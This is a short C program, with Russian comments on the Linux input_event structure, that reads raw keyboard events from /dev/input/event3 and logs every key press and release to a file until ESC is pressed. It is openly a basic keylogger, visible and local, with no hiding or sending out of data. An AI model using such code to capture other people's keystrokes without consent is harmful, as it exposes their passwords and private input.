#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

#include <linux/input.h>
#include "keys.h"


#define KEYBOARDFILE "/dev/input/event3"


/* SOME DOCS FOR INPUT_EVENT:
 * @time - это timestamp, он возвращает время, в которое произошло событие.
 * @type - это, например, EV_REL для относительного момента, EV_KEY для нажатия клавиши или освобождать. Другие типы определены в include/linux/input-event-codes.h .
 * @code - это код события, например REL_X или KEY_BACKSPACE, опять же полный список находится в include/linux/input-event-codes.h .
 * @value - это значение, которое несет событие. Либо относительное изменение для EV_REL, абсолютное новое значение для EV_ABS (джойстики ...), или 0 для EV_KEY для релиз, 1 для keypress и 2 на автоповторе.
 */



int main(int argc, char** argv) {
	if (argc < 2 || argc > 2) {
		printf("Usage: %s <keylogFile>\n", argv[0]);
		exit(EXIT_FAILURE);
	}
	FILE* file;
	struct input_event ie;
	uint16_t code, type;
	int16_t value;
	FILE* log_file = fopen(argv[1], "w");

	if((file = fopen(KEYBOARDFILE, "rb")) == NULL) {
		perror("Reading keyboard file error");
		exit(EXIT_FAILURE);
	}

	if (log_file == NULL) {
		perror("Opening log file error");
		exit(EXIT_FAILURE);
	}

	printf("Start listening...\n");
	while(fread(&ie, sizeof(struct input_event), 1, file)) {
		code = ie.code;
		type = ie.type;
		value = ie.value;

		char key = getCharByCode(code);
		if (type != EV_FF_STATUS) {
			if (code == KEY_ESC && type == EV_KEY) {
				fclose(log_file);
				fclose(file);
				printf("[ESC] was pressed. Leaving program\n");
				exit(EXIT_SUCCESS);
			}
		}
		if (type == EV_KEY && value == 1) // PRESSED
			fprintf(log_file, "[PRESSED    ]  %c\n", key);
		else if (type == EV_KEY && value == 0) // RELEASED
			fprintf(log_file, "[RELEASED   ]  %c\n", key);

	}
	fclose(log_file);
	fclose(file);
	return 0;
}
